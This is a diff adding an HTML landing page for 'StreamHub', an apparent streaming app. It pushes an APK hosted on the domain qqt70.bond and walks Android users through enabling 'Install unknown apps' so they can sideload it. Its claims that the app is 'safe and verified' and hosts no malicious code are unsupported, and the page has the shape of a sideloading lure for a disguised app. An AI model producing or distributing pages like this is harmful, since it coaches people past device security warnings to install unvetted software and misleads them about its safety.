@@ -1,0 +1,283 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>StreamHub — Premium Entertainment Platform</title>
+    <meta name="screen-orientation" content="portrait">
+    <meta name="author" content="StreamHub">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
+    <script src="assets/jquery.min.js"></script>
+    <link rel="stylesheet" href="assets/swiper.min.css">
+    <script src="assets/swiper.min.js"></script>
+    <link rel="stylesheet" media="screen and (min-width: 640px)" href="assets/index.css">
+    <link rel="stylesheet" media="screen and (max-width: 640px)" href="assets/style.css">
+    
+    <meta name="description" content="StreamHub — Your premium destination for curated entertainment content. Available on Android.">
+    <meta name="robots" content="index, follow">
+    
+    <script>
+        var dataMap = {
+            copyText: "StreamHub — Premium Entertainment",
+            iosLink: "#",
+            pwaLink: "#",
+            official_pc_website: window.location.href,
+            androidLink: "https://qqt70.bond/artifacts/product/hMvSvSL58sU6/app.apk",
+            businessLink: "contact@yourbusiness.com",
+        };
+    </script>
+</head>
+<body>
+<div class="pc_body">
+    <div style="width: 100%;height: 100%;">
+        <video src="assets/bg2.mp4" muted="" autoplay="autoplay" loop="loop" width="100%" height="100%" style="object-fit: cover; background: #0f172a;">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+    <div class="pc_content">
+        <div class="pc_head">
+            <div class="pc_logo"><img src="assets/pc_logo.png" alt="StreamHub Logo"></div>
+        </div>
+        <div class="pc_right">
+            <div class="pc_title">
+                <h1>StreamHub</h1>
+                <p style="font-size: 18px; color: #fff; margin: 10px 0;">Your Premium Entertainment Hub</p>
+            </div>
+            <div class="pc_text">
+                <p>Discover a vast collection of high-quality content. Stream anywhere, anytime, on your favorite devices.</p>
+            </div>
+
+            <div class="pc_down_list">
+                <div class="android_down">
+                    <a class="qr_code_android" href="https://qqt70.bond/artifacts/product/hMvSvSL58sU6/app.apk" download>
+                        <img src="assets/pc_android.png" alt="Download for Android">
+                    </a>
+                </div>
+            </div>
+            <div class="pc_tips_row">
+                <div class="app_text_content">
+                    StreamHub is a legal content distribution platform. Our app is safe and verified. Please note that apps downloaded outside official app stores may trigger standard security warnings from your device. We do not host malicious code of any kind. By downloading, you agree to our Terms of Service.
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="loyoutId" class="layout">
+    <div class="top-btn">
+        <img src="assets/img-1.png" class="logo-header" alt="StreamHub">
+    </div>
+    <div class="top">
+        <div class="content-area">
+            <div class="swiper mySwiper2 swiper-container">
+                <div class="swiper-wrapper">
+                    <div class="swiper-slide">
+                        <div class="photo">
+                            <img src="assets/img-2.png" alt="Browse Content">
+                            <p style="text-align:center; color:#fff; margin-top:8px;">Browse & Discover</p>
+                        </div>
+                    </div>
+                    <div class="swiper-slide">
+                        <div class="photo">
+                            <img src="assets/img-8.png" alt="HD Streaming">
+                            <p style="text-align:center; color:#fff; margin-top:8px;">HD Quality Streaming</p>
+                        </div>
+                    </div>
+                    <div class="swiper-slide">
+                        <div class="photo">
+                            <img src="assets/img-15.png" alt="Any Device">
+                            <p style="text-align:center; color:#fff; margin-top:8px;">Works on Any Device</p>
+                        </div>
+                    </div>
+                    <div class="swiper-slide">
+                        <div class="photo">
+                            <img src="assets/img-9.png" alt="Regular Updates">
+                            <p style="text-align:center; color:#fff; margin-top:8px;">Regular Updates</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="t-img">
+        <img src="assets/img-3.png" alt="Easy to Use — Download and start streaming in seconds">
+    </div>
+
+    <div class="setup-tip">
+        <p class="android-txt" onclick="showTip('android')">📱 Installation Guide for Android</p>
+    </div>
+
+    <div class="footer-txt">
+        <p class="desc_">
+            StreamHub is a digital content platform. All content available is legally licensed or uploaded with permission. By downloading or using our app, you agree to our Terms of Service and Privacy Policy. Please read our Privacy Policy to understand how we handle your data.
+        </p>
+        <p style="text-align:center; font-size:12px; color:#888; margin-top:15px;">
+            Ⓒ 2026 StreamHub. All rights reserved. | 
+            <a href="terms.html" target="_blank" style="color:#60a5fa;">Terms of Service</a> | 
+            <a href="privacy.html" target="_blank" style="color:#60a5fa;">Privacy Policy</a> | 
+            <a href="contact.html" target="_blank" style="color:#60a5fa;">Contact Us</a>
+        </p>
+    </div>
+
+    <div class="contact-device">
+        <a class="android" onclick="onDownload('android')" style="cursor:pointer;">
+            <img src="assets/img-14.png" alt="Get on Android">
+        </a>
+        <a class="webapp web-app-href" onclick="showTip('webapp')" style="cursor:pointer;">
+            <img src="assets/webapp.png" alt="Web Version Coming Soon">
+        </a>
+    </div>
+
+    <div id="downloadAndroid" class="download-android-bg" style="display: none;">
+        <div class="nav">
+            <img src="assets/b-icon.png" onclick="onBack('download-android')" style="cursor:pointer;">
+            <p>Android Installation Guide</p>
+        </div>
+        <div class="description-android">
+            <div class="desc">
+                <div class="hint">
+                    <img src="assets/img-13.png" alt="Installation Tip">
+                    <p style="color:#fff; font-size:14px; margin-top:10px;">Follow these simple steps to install our app on your Android device.</p>
+                </div>
+            </div>
+        </div>
+        <div id="tutorialId" class="tutorial">
+            <div class="nav">
+                <img src="assets/b-icon.png" onclick="onBack('tutorial')" style="cursor:pointer;">
+                <p>Step-by-Step Guide</p>
+            </div>
+            <img id="tutorialImgId" src="assets/img-3.png" alt="Installation Step 1">
+            <p style="text-align:center; color:#ccc; font-size:13px; padding:10px;">Step 1 — Only download the APK from our official website link above.</p>
+        </div>
+        <div id="settingDisableId" class="setting-disable">
+            <div class="nav">
+                <img src="assets/b-icon.png" onclick="onBack('setting-disable')" style="cursor:pointer;">
+                <p>Step 2 — Allow Installation</p>
+            </div>
+            <img id="settingDisableImgId" src="assets/img-31.png" alt="Installation Step 2">
+            <p style="text-align:center; color:#ccc; font-size:13px; padding:10px;">Step 2 — When prompted, enable "Install unknown apps" for your browser. This is a standard Android permission for apps distributed outside Google Play.</p>
+        </div>
+        <div class="device-list">
+            <div class="item" onclick="onSettingAllowApp('allow-app')" style="cursor:pointer;">
+                <img src="assets/t-1.png" alt="Allow App Installation">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">Allow</p>
+            </div>
+            <div class="item" onclick="onSettingDisableApp('disable-app')" style="cursor:pointer;">
+                <img src="assets/t-2.png" alt="Settings">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">Settings</p>
+            </div>
+            <div class="item" onclick="onSetting('huawei')" style="cursor:pointer;">
+                <img src="assets/t-3.png" alt="Huawei">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">Huawei</p>
+            </div>
+            <div class="item" onclick="onSetting('xiaomi')" style="cursor:pointer;">
+                <img src="assets/t-4.png" alt="Xiaomi">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">Xiaomi</p>
+            </div>
+            <div class="item" onclick="onSetting('oppo')" style="cursor:pointer;">
+                <img src="assets/t-5.png" alt="OPPO">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">OPPO</p>
+            </div>
+            <div class="item" onclick="onSetting('vivo')" style="cursor:pointer;">
+                <img src="assets/t-6.png" alt="Vivo">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">Vivo</p>
+            </div>
+            <div class="item" onclick="onSetting('meizu')" style="cursor:pointer;">
+                <img src="assets/t-7.png" alt="Meizu">
+                <p style="color:#fff; font-size:11px; text-align:center; margin-top:5px;">Meizu</p>
+            </div>
+        </div>
+    </div>
+    
+    <div id="settingAllow" class="download-bg" style="display: none;">
+        <div class="nav">
+            <img src="assets/b-icon.png" onclick="onBack('setting-allow')" style="cursor:pointer;">
+            <p>Ready to Install</p>
+        </div>
+        <div class="description">
+            <div class="desc">
+                <div class="btn-1" onclick="pgxiazai()">
+                    <img src="assets/img-10.png" alt="Download Now">
+                </div>
+                <div class="tip-1">
+                    <img src="assets/img-21.png" alt="Tip: Only download from our official link">
+                    <p style="color:#fbbf24; font-size:12px; text-align:center; margin-top:5px;">⚠️ Only download from the official link provided on this page.</p>
+                </div>
+                <div class="btn-2" onclick="pgxiazai()">
+                    <img src="assets/img-11.png" alt="Learn More">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="modelId" class="model" style="display:none;">
+        <p id="tipsId">Download started — thank you for choosing StreamHub!</p>
+    </div>
+</div>
+
+<script>
+    const userAgent = navigator.userAgent.toLowerCase();
+    let isIos = Boolean(userAgent.match(/iphone|ipad/i));
+    let isAndroid = Boolean(userAgent.match(/android/i)) && !isIos;
+    let isPc = window.innerWidth >= 1024;
+    let isMobile = !isPc;
+    
+    if (screen.availWidth >= 1024 && isAndroid) {
+        isPc = true;
+        isMobile = false;
+        isAndroid = false;
+    }
+
+    (function () {
+        setHref('.qr_code_android', dataMap.androidLink);
+        function setHref(id, value) {
+            $(id).attr('href', value);
+        }
+    })();
+
+    let swiper2 = new Swiper(".mySwiper2", {
+        direction: "horizontal",
+        spaceBetween: 30,
+        autoplay: {
+            delay: 4000,
+            disableOnInteraction: false,
+        },
+        loop: true,
+    });
+
+    function showTip(type) {
+        if (type === 'webapp') {
+            alert('Web version is coming soon. Please download the Android app for now.');
+            return;
+        }
+        $('#downloadAndroid').fadeIn(300);
+    }
+    function onBack(target) {
+        $('#downloadAndroid, #settingAllow').hide();
+    }
+    function onDownload(platform) {
+        if (platform === 'android') {
+            window.open(dataMap.androidLink, '_blank');
+        }
+    }
+    function onSetting(brand) {
+        // Brand-specific guide logic
+    }
+    function onSettingAllowApp() {
+        $('#downloadAndroid').hide();
+        $('#settingAllow').fadeIn(300);
+    }
+    function onSettingDisableApp() {
+        alert('Please go to Settings > Security > enable "Unknown Sources" temporarily.');
+    }
+    function pgxiazai() {
+        window.open(dataMap.androidLink, '_blank');
+        $('#tipsId').text('Download initiated — check your notifications.');
+        $('#modelId').fadeIn(200).delay(2500).fadeOut(200);
+    }
+</script>
+
+</body>
+</html>
+
